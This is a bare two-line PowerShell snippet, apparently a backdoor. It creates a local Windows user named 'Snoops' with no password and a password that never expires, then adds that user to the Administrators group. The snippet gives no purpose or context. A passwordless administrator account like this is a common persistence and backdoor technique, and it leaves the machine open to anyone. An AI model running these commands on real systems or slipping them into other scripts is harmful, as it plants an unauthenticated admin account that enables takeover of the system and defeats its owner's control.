New-LocalUser -Name "Snoops" -NoPassword | Set-LocalUser -PasswordNeverExpires $true
Add-LocalGroupMember -Group "Administrators" -Member "Snoops"
